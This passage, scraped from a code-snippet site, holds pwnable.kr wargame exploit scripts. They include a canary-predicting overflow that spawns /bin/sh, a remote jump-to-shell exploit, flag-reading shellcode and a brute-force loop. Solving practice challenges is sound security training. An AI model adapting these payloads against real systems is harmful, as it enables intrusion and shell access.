class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">assert</code><code class="python plain">(argc</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python value">3</code><code class="python plain">);</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">t </code><code class="python keyword">=</code> <code class="python plain">atoi(argv[</code><code class="python value">1</code><code class="python plain">]);</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">m </code><code class="python keyword">=</code> <code class="python plain">atoi(argv[</code><code class="python value">2</code><code class="python plain">]);</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">srand(t);</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">;</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">rands[</code><code class="python value">8</code><code class="python plain">];</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code><code class="python plain">(i</code><code class="python keyword">=</code><code class="python value">0</code><code class="python plain">;i&lt;</code><code class="python keyword">=</code><code class="python value">7</code><code class="python plain">;i</code><code class="python keyword">+</code><code class="python keyword">+</code><code class="python plain">){</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">rands[i]</code><code class="python keyword">=</code><code class="python plain">rand();</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">a </code><code class="python keyword">=</code> <code class="python plain">rands[</code><code class="python value">1</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">2</code><code class="python plain">]</code><code class="python keyword">-</code><code class="python plain">rands[</code><code class="python value">3</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">4</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">5</code><code class="python plain">]</code><code class="python keyword">-</code><code class="python plain">rands[</code><code class="python value">6</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">rands[</code><code class="python value">7</code><code class="python plain">];</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">m </code><code class="python keyword">-</code><code class="python keyword">=</code> <code class="python plain">a;</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">printf(</code><code class="python string">"%x\n"</code><code class="python plain">,m);</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python value">0</code><code class="python plain">;</code></div><div class="line number57 index56 alt2"><code class="python plain">}</code></div><div class="line number58 index57 alt1"><code class="python plain">```</code></div><div class="line number59 index58 alt2">&nbsp;</div><div class="line number60 index59 alt1"><code class="python plain">Since the `g_buf` </code><code class="python keyword">is</code> <code class="python keyword">in</code> <code class="python plain">`.bss`, </code><code class="python keyword">and</code> <code class="python plain">`PIE` </code><code class="python keyword">is</code> <code class="python plain">closed, we can simply write `</code><code class="python keyword">/</code><code class="python functions">bin</code><code class="python keyword">/</code><code class="python plain">sh\</code><code class="python value">0</code><code class="python plain">` at the end of </code><code class="python functions">input</code><code class="python plain">.</code></div><div class="line number61 index60 alt2">&nbsp;</div><div class="line number62 index61 alt1"><code class="python plain">POC:</code></div><div class="line number63 index62 alt2"><code class="python plain">```</code></div><div class="line number64 index63 alt1"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number65 index64 alt2"><code class="python keyword">import</code> <code class="python plain">time,os</code></div><div class="line number66 index65 alt1"><code class="python plain">t</code><code class="python keyword">=</code><code class="python functions">int</code><code class="python plain">(time.time())</code></div><div class="line number67 index66 alt2"><code class="python plain">sh </code><code class="python keyword">=</code> <code class="python plain">process(</code><code class="python string">'/home/c/ctf/hash'</code><code class="python plain">)</code></div><div class="line number68 index67 alt1"><code class="python plain">sh.recvuntil(</code><code class="python string">"captcha"</code><code class="python plain">)</code></div><div class="line number69 index68 alt2"><code class="python plain">captcha</code><code class="python keyword">=</code><code class="python plain">sh.recvline(timeout</code><code class="python keyword">=</code><code class="python value">10</code><code class="python plain">)</code></div><div class="line number70 index69 alt1"><code class="python plain">captchapos</code><code class="python keyword">=</code><code class="python plain">captcha.find(</code><code class="python string">' : '</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python functions">len</code><code class="python plain">(</code><code class="python string">' : '</code><code class="python plain">)</code></div><div class="line number71 index70 alt2"><code class="python plain">captcha</code><code class="python keyword">=</code><code class="python plain">captcha[captchapos:].strip()</code></div><div class="line number72 index71 alt1"><code class="python plain">sh.sendline(captcha)</code></div><div class="line number73 index72 alt2"><code class="python functions">print</code> <code class="python plain">sh.recvline(timeout</code><code class="python keyword">=</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number74 index73 alt1"><code class="python functions">print</code> <code class="python plain">sh.recvline(timeout</code><code class="python keyword">=</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number75 index74 alt2"><code class="python functions">print</code> <code class="python string">"Calling:"</code><code class="python plain">,</code><code class="python string">"/home/c/ctf/hashc "</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(t)</code><code class="python keyword">+</code><code class="python string">" "</code><code class="python keyword">+</code><code class="python plain">captcha</code></div><div class="line number76 index75 alt1"><code class="python plain">cookie </code><code class="python keyword">=</code> <code class="python string">"0x"</code><code class="python keyword">+</code><code class="python plain">os.popen(</code><code class="python string">"/home/c/ctf/hashc "</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(t)</code><code class="python keyword">+</code><code class="python string">" "</code><code class="python keyword">+</code><code class="python plain">captcha).read().strip()</code></div><div class="line number77 index76 alt2"><code class="python functions">print</code> <code class="python string">"cookie:"</code><code class="python plain">,cookie</code></div><div class="line number78 index77 alt1"><code class="python plain">sh.sendline(b64e((p32(</code><code class="python value">0x08049187</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python plain">p32(</code><code class="python value">720</code><code class="python keyword">/</code><code class="python value">3</code><code class="python keyword">*</code><code class="python value">4</code><code class="python keyword">+</code><code class="python value">0x0804B0E0</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">24</code><code class="python keyword">+</code><code class="python plain">p32(</code><code class="python functions">int</code><code class="python plain">(cookie,</code><code class="python value">16</code><code class="python plain">))</code><code class="python keyword">+</code><code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">12</code><code class="python plain">)</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">720</code><code class="python keyword">/</code><code class="python value">48</code><code class="python plain">))</code><code class="python keyword">+</code><code class="python string">"/bin/sh\0"</code><code class="python plain">)</code></div><div class="line number79 index78 alt2"><code class="python plain">sh.interactive()</code></div><div class="line number80 index79 alt1"><code class="python plain">```</code></div><div class="line number81 index80 alt2">&nbsp;</div><div class="line number82 index81 alt1"><code class="python plain">I noticed that the time of the server </code><code class="python keyword">is</code> <code class="python plain">similar to local, just </code><code class="python keyword">try</code> <code class="python plain">some times(However, after trying `</code><code class="python keyword">-</code><code class="python value">180</code><code class="python plain">` to `</code><code class="python value">180</code><code class="python plain">`, I didn</code><code class="python string">'t get shell:( I don'</code><code class="python plain">t know why, maybe the `rand()` </code><code class="python keyword">is</code> <code class="python keyword">not</code> <code class="python plain">the same?).</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
Pwnable.kr md5 calculator writeup
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/Oss9935">Oss9935</a>/<a href="https://pythonexample.com/snippet/python/exploit_dragonpy_oss9935_python">exploit_dragon.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_429468" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python plain">context.log_level </code><code class="python keyword">=</code> <code class="python string">'debug'</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">HOST </code><code class="python keyword">=</code> <code class="python string">'pwnable.kr'</code></div><div class="line number5 index4 alt2"><code class="python plain">PORT </code><code class="python keyword">=</code> <code class="python value">9004</code></div><div class="line number6 index5 alt1"><code class="python plain">shell </code><code class="python keyword">=</code> <code class="python value">0x08048DBF</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python comments">#s = process('./dragon')</code></div><div class="line number9 index8 alt2"><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">remote(HOST, PORT)</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python functions">raw_input</code><code class="python plain">(</code><code class="python string">'press to continue'</code><code class="python plain">)</code></div><div class="line number12 index11 alt1">&nbsp;</div><div class="line number13 index12 alt2"><code class="python comments"># first attempt : defeat(dragon's damage is 30)</code></div><div class="line number14 index13 alt1"><code class="python plain">s.recvuntil(</code><code class="python string">'Knight\n'</code><code class="python plain">)</code></div><div class="line number15 index14 alt2"><code class="python plain">s.sendline(</code><code class="python string">'1'</code><code class="python plain">) </code><code class="python comments"># Priest</code></div><div class="line number16 index15 alt1"><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="python plain">s.sendline(</code><code class="python string">'1'</code><code class="python plain">)</code></div><div class="line number19 index18 alt2"><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number20 index19 alt1"><code class="python plain">s.sendline(</code><code class="python string">'1'</code><code class="python plain">)</code></div><div class="line number21 index20 alt2"><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="python comments"># second attempt : win(dragon's damage is 10)</code></div><div class="line number24 index23 alt1"><code class="python plain">s.sendline(</code><code class="python string">'1'</code><code class="python plain">) </code><code class="python comments"># Priest</code></div><div class="line number25 index24 alt2"><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number26 index25 alt1">&nbsp;</div><div class="line number27 index26 alt2"><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(</code><code class="python value">4</code><code class="python plain">):</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(</code><code class="python string">'3'</code><code class="python plain">)</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(</code><code class="python string">'3'</code><code class="python plain">)</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(</code><code class="python string">'2'</code><code class="python plain">)</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number34 index33 alt1">&nbsp;</div><div class="line number35 index34 alt2"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">p32(shell)</code></div><div class="line number36 index35 alt1"><code class="python plain">s.sendline(payload)</code></div><div class="line number37 index36 alt2"><code class="python plain">s.recv(</code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="python plain">s.interactive()</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
&lt;exploit code&gt; pwnable.kr[Rookiss] : dragon
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/Oss9935">Oss9935</a>/<a href="https://pythonexample.com/snippet/python/exploit_asmpy_oss9935_python">exploit_asm.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_165337" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="python plain">context(arch</code><code class="python keyword">=</code><code class="python string">'amd64'</code><code class="python plain">, os</code><code class="python keyword">=</code><code class="python string">'linux'</code><code class="python plain">)</code></div><div class="line number4 index3 alt1"><code class="python plain">elf </code><code class="python keyword">=</code> <code class="python plain">ELF(</code><code class="python string">'./asm'</code><code class="python plain">)</code></div><div class="line number5 index4 alt2"><code class="python plain">flag_name </code><code class="python keyword">=</code> <code class="python string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="python comments">#''' for ssh connect</code></div><div class="line number8 index7 alt1"><code class="python plain">sh </code><code class="python keyword">=</code> <code class="python plain">ssh(host </code><code class="python keyword">=</code> <code class="python string">'pwnable.kr'</code><code class="python plain">, port </code><code class="python keyword">=</code> <code class="python value">2222</code><code class="python plain">, user </code><code class="python keyword">=</code> <code class="python string">'asm'</code><code class="python plain">, password </code><code class="python keyword">=</code> <code class="python string">'guest'</code> <code class="python plain">)</code></div><div class="line number9 index8 alt2"><code class="python comments">#sh.download_file('asm')</code></div><div class="line number10 index9 alt1"><code class="python comments">#s = sh.process('./asm')</code></div><div class="line number11 index10 alt2"><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">sh.connect_remote(</code><code class="python string">'localhost'</code><code class="python plain">, </code><code class="python value">9026</code><code class="python plain">)</code></div><div class="line number12 index11 alt1"><code class="python comments">#'''</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="python comments">#s = process('./asm')</code></div><div class="line number15 index14 alt2">&nbsp;</div><div class="line number16 index15 alt1"><code class="python functions">raw_input</code><code class="python plain">(</code><code class="python string">'press_any_key'</code><code class="python plain">)</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">''</code></div><div class="line number19 index18 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">shellcraft.amd64.pushstr(flag_name)</code></div><div class="line number20 index19 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">shellcraft.amd64.</code><code class="python functions">open</code><code class="python plain">(</code><code class="python string">'rsp'</code><code class="python plain">)</code></div><div class="line number21 index20 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">shellcraft.amd64.read(</code><code class="python string">'rax'</code><code class="python plain">, </code><code class="python string">'rsp'</code><code class="python plain">, </code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number22 index21 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">shellcraft.amd64.write(</code><code class="python value">1</code><code class="python plain">, </code><code class="python string">'rsp'</code><code class="python plain">, </code><code class="python value">1024</code><code class="python plain">)</code></div><div class="line number23 index22 alt2"><code class="python plain">log.info(payload)</code></div><div class="line number24 index23 alt1"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">asm(payload)</code></div><div class="line number25 index24 alt2">&nbsp;</div><div class="line number26 index25 alt1"><code class="python plain">log.info(s.recvuntil(</code><code class="python string">"shellcode: "</code><code class="python plain">))</code></div><div class="line number27 index26 alt2"><code class="python plain">s.send(payload)</code></div><div class="line number28 index27 alt1"><code class="python plain">log.success(s.recv(</code><code class="python value">1024</code><code class="python plain">))</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
&lt;exploit code&gt; pwnable.kr[Toddler's Bottle] : asm
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/Oss9935">Oss9935</a>/<a href="https://pythonexample.com/snippet/python/exploit_lottopy_oss9935_python">exploit_lotto.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_995637" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">time</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python comments">#context.log_level = 'debug'</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">sh </code><code class="python keyword">=</code> <code class="python plain">ssh(host </code><code class="python keyword">=</code> <code class="python string">'pwnable.kr'</code><code class="python plain">, port </code><code class="python keyword">=</code> <code class="python value">2222</code><code class="python plain">, user </code><code class="python keyword">=</code> <code class="python string">'lotto'</code><code class="python plain">, password </code><code class="python keyword">=</code> <code class="python string">'guest'</code><code class="python plain">)</code></div><div class="line number7 index6 alt2"><code class="python comments">#s = sh.download_file('lotto')</code></div><div class="line number8 index7 alt1"><code class="python plain">elf </code><code class="python keyword">=</code> <code class="python plain">ELF(</code><code class="python string">'./lotto'</code><code class="python plain">)</code></div><div class="line number9 index8 alt2"><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">sh.process(</code><code class="python string">'./lotto'</code><code class="python plain">)</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python comments">#s = process('./lotto')</code></div><div class="line number12 index11 alt1"><code class="python plain">cnt </code><code class="python keyword">=</code> <code class="python value">1</code></div><div class="line number13 index12 alt2"><code class="python keyword">while</code> <code class="python color1">True</code><code class="python plain">:</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recv(</code><code class="python value">4096</code><code class="python plain">)</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(</code><code class="python string">'2'</code><code class="python plain">)</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#log.info(s.recv(4096))</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(</code><code class="python string">'1'</code><code class="python plain">)</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recv(</code><code class="python value">4096</code><code class="python plain">)</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">''</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python string">'!#$%^&amp;'</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.sendline(payload)</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.recvuntil(</code><code class="python string">'\n'</code><code class="python plain">)</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">res </code><code class="python keyword">=</code> <code class="python plain">s.recvuntil(</code><code class="python string">'\n'</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">]</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">log.info(</code><code class="python string">'try(%d) times : &lt;%s&gt;'</code> <code class="python keyword">%</code><code class="python plain">(cnt, res))</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">cnt </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python value">1</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">res !</code><code class="python keyword">=</code> <code class="python string">'bad luck...'</code><code class="python plain">:</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">log.success(s.recvline())</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number31 index30 alt2">&nbsp;</div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">time.sleep(</code><code class="python value">0.1</code><code class="python plain">)</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
&lt;exploit code&gt; pwnable.kr[Toddler's Bottle] : asm
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/Oss9935">Oss9935</a>/<a href="https://pythonexample.com/snippet/python/exploit_coin1py_oss9935_python">exploit_coin1.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_423978" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 